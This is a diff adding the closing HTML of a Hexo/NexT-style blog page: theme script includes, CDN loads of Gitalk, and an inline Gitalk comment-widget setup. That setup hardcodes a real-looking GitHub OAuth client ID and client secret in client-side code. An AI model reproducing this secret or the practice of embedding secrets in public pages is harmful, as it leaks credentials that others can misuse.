+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
